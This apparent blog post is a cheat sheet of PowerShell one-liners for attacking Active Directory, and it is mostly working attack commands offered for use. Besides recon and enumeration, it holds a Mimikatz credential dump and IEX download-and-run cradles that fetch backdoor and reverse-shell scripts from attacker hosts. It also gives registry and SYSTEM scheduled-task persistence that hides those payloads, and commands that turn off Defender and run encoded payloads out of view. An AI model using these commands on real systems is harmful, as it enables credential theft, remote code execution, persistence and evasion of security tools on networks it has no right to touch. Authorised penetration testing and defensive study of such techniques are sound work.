---
title: "Power-S-Hell"
date: 2025-04-10 +0530
categories: [Cyber-Security]
tags: [powershell, power, hell, history, file, active-directory, windows, recon, ad, lateral-movement, persistence, evasion]
order: 4
---

This is a collection of PowerShell one-liners for **Active Directory (AD) pentesting**, including recon, enumeration, lateral movement, persistence, evasion, and payload delivery.

## 🧾 PowerShell History File

```
C:\Users\user01\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Stored command history — often contains creds, recon, or tooling clues.

## 🏷️ Whoami & Token Info

```powershell
whoami /all
whoami /priv
Get-ProcessTokenPrivilege
```

View current user identity, privileges, and token info.

## 🧠 Domain Info

```powershell
(Get-WmiObject Win32_ComputerSystem).Domain
(Get-ADDomain).Forest
(Get-ADDomainController -Discover).Name
```

Get basic domain and forest information.

## 🔍 User Enumeration

```powershell
Get-ADUser -Filter * -Properties DisplayName,Description | select Name,DisplayName,Description
net user /domain
```

Enumerate domain users with additional context.

## 🖥️ Computer Enumeration

```powershell
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem,LastLogonDate
```

List domain-joined systems with OS and last login info.

## 🏠 Group Memberships

```powershell
net group "Domain Admins" /domain
Get-ADGroupMember "Domain Admins"
```

Check domain admin members.

## 🔐 Password Policy & Trusts

```powershell
(Get-ADDefaultDomainPasswordPolicy)
Get-ADTrust -Filter *
```

Inspect domain password requirements and trust relationships.

## 🔎 Current Session Info

```powershell
qwinsta
query user
```

See who’s currently logged in.

## 💻 Network Shares Discovery

```powershell
net view /domain
net view \\targethost
Invoke-ShareFinder -Verbose
```

Enumerate visible network shares.

## 📁 Share Access Test

```powershell
Invoke-CheckLocalAdminAccess -ComputerName targethost
Invoke-SmbEnum -ComputerName targethost
```

Check access rights and share contents remotely.

## 🔓 Kerberoasting Candidates

```powershell
Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object { $_.ServicePrincipalName -ne $null } | Select SamAccountName, ServicePrincipalName
```

Find SPN-enabled accounts for ticket extraction.

## 📬 Mailbox Discovery

```powershell
Get-ADUser -Filter * -Properties mail | Where-Object {$_.mail -ne $null} | Select Name, mail
```

List domain users with email addresses.

## 🧠 BloodHound Ingestors (SharpHound)

```powershell
Invoke-WebRequest -Uri http://<attacker>/SharpHound.exe -OutFile SharpHound.exe
.\SharpHound.exe -c All
```

Collect AD data for analysis in BloodHound.

## 🔑 Dump Hashes (if Admin)

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

Dump logon credentials from memory.

## 🕵️‍♂️ DNS + Reverse Lookup

```powershell
Resolve-DnsName target.domain.local
[System.Net.Dns]::GetHostEntry("192.168.1.100")
```

Identify IPs and names within the domain.

## 📦 Remote Payload Execution

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
```

Load and run remote scripts in memory.

## 🔀 Lateral Movement

```powershell
Invoke-WMICommand -ComputerName target -Command "whoami"
Invoke-Command -ComputerName target -ScriptBlock { hostname }
Enter-PSSession -ComputerName target
Invoke-SMBExec -Target target -Command "ipconfig /all"
```

Remotely execute commands or enter sessions.

## 🧬 Persistence

```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "powershell.exe -WindowStyle Hidden -Command 'IEX (New-Object Net.WebClient).DownloadString(`'http://attacker/payload.ps1`')'"
```

Add script to startup via registry key.

```powershell
schtasks /create /tn "Updater" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File update.ps1" /sc minute /mo 5 /ru SYSTEM
```

Create recurring scheduled task for persistence.

## 🎭 Defender Evasion

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\Users\Public"
powershell -exec bypass -w hidden -EncodedCommand <base64payload>
```

Disable Defender and hide payload execution.

## 💥 Custom Payload Execution

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/backdoor.ps1')
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')
```

Alternate ways to launch remote payloads.